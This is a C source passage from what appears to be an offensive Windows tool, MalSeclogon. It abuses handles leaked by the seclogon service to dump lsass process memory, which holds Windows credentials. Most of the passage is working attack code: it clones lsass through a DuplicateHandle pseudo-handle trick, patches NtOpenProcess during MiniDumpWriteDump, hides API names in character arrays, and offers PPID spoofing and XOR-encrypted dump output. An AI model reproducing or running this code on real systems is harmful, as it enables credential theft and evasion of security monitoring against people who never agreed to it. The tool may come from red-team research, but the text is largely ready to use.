	wchar_t ntdllStr[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0x00, 0x00 };
	char MiniDumpWriteDumpStr[] = { 'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', 0x00 };
	char NtCreateProcessExStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'E', 'x', 0x00 };
	pMiniDumpWriteDump MiniDumpWriteDumpDyn = NULL;
	pNtCreateProcessEx NtCreateProcessEx = NULL;
	char oldCode[15];
	int oldCodeSize;
	HANDLE hLeakedHandleWithCreateProcessAccess = NULL, hLsassClone = NULL, hLsass = NULL;
	RtlZeroMemory(oldCode, 15);
	MiniDumpWriteDumpDyn = (pMiniDumpWriteDump)GetProcAddress(LoadLibrary(dbgcoreStr), MiniDumpWriteDumpStr);
	if (useLsassClone) NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(LoadLibrary(ntdllStr), NtCreateProcessExStr);
	// now we expect to have leaked handles in our current process. Even if the seclogon can duplicate 3 handles at a time it seems it duplicates each one 2 times, so total handles = 6
	for (__int64 leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4) {
		if (GetProcessId((HANDLE)leakedHandle) == lsassPid) {
			hLsass = NULL;
			HANDLE hFileDmp = CreateFile(dumpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (useLsassClone) {
				// the leaked handle does not have PROCESS_CREATE_PROCESS right so we cannot use it for NtCreateProcessEx call. Using a trick by @tiraniddo to get a handle with full access:
				// "The DuplicateHandle system call has an interesting behaviour when using the pseudo current process handle, which has the value -1. Specifically if you try and duplicate the pseudo handle from another process you get back a full access handle to the source process."
				// details here --> https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
				DuplicateHandle((HANDLE)leakedHandle, (HANDLE)-1, GetCurrentProcess(), &hLeakedHandleWithCreateProcessAccess, 0, FALSE, DUPLICATE_SAME_ACCESS);
				NTSTATUS status = NtCreateProcessEx(&hLsassClone, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, NULL, hLeakedHandleWithCreateProcessAccess, 0, NULL, NULL, NULL, FALSE);
				if (status != 0) {
					printf("NtCreateProcessEx failed with ntstatus 0x%08x", status);
					exit(-1);
				}
				hLsass = hLsassClone;
			}
			else
				hLsass = (HANDLE)leakedHandle;
			// we ensure no one will close the handle, it seems RtlQueryProcessDebugInformation() called from MiniDumpWriteDump() try to close it
			SetHandleInformation(hLsass, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
			// we need to patch NtOpenProcess because MiniDumpWriteDump() would open a new handle to lsass and we want to avoid that
			ReplaceNtOpenProcess((HANDLE)hLsass, oldCode, &oldCodeSize);
			BOOL result = MiniDumpWriteDumpDyn((HANDLE)hLsass, GetProcessId(hLsass), hFileDmp, MiniDumpWithFullMemory, NULL, NULL, NULL);
			RestoreNtOpenProcess(oldCode, oldCodeSize);
			CloseHandle(hFileDmp);
			// unprotect the handle for close
			SetHandleInformation(hLsass, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
			CloseHandle(hLsass);
			if (result)
				break;
			else
				DeleteFile(dumpPath);
		}
		else
			CloseHandle((HANDLE)leakedHandle);
	}
}

DWORD GetLsassPid() {
	return GetPidUsingFilePath(L"\\Windows\\system32\\lsass.exe");
}

DWORD GetPidUsingFilePath(wchar_t* processBinaryPath) {
	DWORD retPid = 0;
	IO_STATUS_BLOCK iosb;
	HANDLE hFile;
	PFILE_PROCESS_IDS_USING_FILE_INFORMATION pfpiufi = NULL;
	int FileProcessIdsUsingFileInformation = 47;
	ULONG pfpiufiLen = 0;
	PULONG_PTR processIdListPtr = NULL;
	NTSTATUS status = 0;
	pNtQueryInformationFile NtQueryInformationFile = (pNtQueryInformationFile)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryInformationFile");
	hFile = CreateFile(processBinaryPath, FILE_READ_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		pfpiufiLen = 8192;
		pfpiufi = (PFILE_PROCESS_IDS_USING_FILE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pfpiufiLen);
		status = NtQueryInformationFile(hFile, &iosb, pfpiufi, pfpiufiLen, (FILE_INFORMATION_CLASS)FileProcessIdsUsingFileInformation);
		while (status == STATUS_INFO_LENGTH_MISMATCH) {
			pfpiufiLen = pfpiufiLen + 8192;
			pfpiufi = (PFILE_PROCESS_IDS_USING_FILE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pfpiufi, pfpiufiLen);
			status = NtQueryInformationFile(hFile, &iosb, pfpiufi, pfpiufiLen, (FILE_INFORMATION_CLASS)FileProcessIdsUsingFileInformation);
		}
		processIdListPtr = pfpiufi->ProcessIdList;
		// we return only the first pid, it's usually the right one
		if (pfpiufi->NumberOfProcessIdsInList >= 1)
			retPid = *processIdListPtr;
		HeapFree(GetProcessHeap(), 0, pfpiufi);
		CloseHandle(hFile);
	}
	return retPid;
}

void usage()
{
	printf("\n\tMalSeclogon v0.2\n\t@splinter_code\n\n");
	printf("Args: \n"
		"-p Pid of the process to spoof the PPID through seclogon service\n"
		"-d Dump lsass method\n"
		"\t1 = Dump lsass by using leaked handles\n"
		"\t2 = Dump lsass by using leaked handles and cloned lsass process\n"
		"\t3 = Dump lsass by stealing handle from seclogon. (Default)\n"
		"-o Output path of the dump (default C:\\lsass.dmp)\n"
		"-c Commandline of the spoofed process, default: cmd.exe (not compatible with -d)\n"
		"-k Xor key to encrypt the dump. Compatible only with -d 3. Allowed values 1-255. Default = 40.\n"
		"-f Path to an encrypted dump file. This decrypt the dump. If no -k key are specified the default value is 40.\n"
	);
	printf("\n");
	printf("Examples: \n"
		"- Run a process with a spoofed PPID:\n"
		"\tMalseclogon.exe -p [PPID] -c cmd.exe\n"
		"- Dump lsass by using leaked handles:\n"
		"\tMalseclogon.exe -d 1\n"
		"- Dump lsass by using leaked handles and cloned lsass process:\n"
		"\tMalseclogon.exe -d 2\n"
		"- Dump lsass by stealing handle from seclogon using xor key 40:\n"
		"\tMalseclogon.exe -d 3 -o C:\\lsass.dmp.xor -k 40\n"
		"- Decrypt an lsass dmp file with the key 40:\n"
		"\tMalseclogon.exe -f C:\\lsass.dmp.xor -k 40\n"
	);
	printf("\n");
}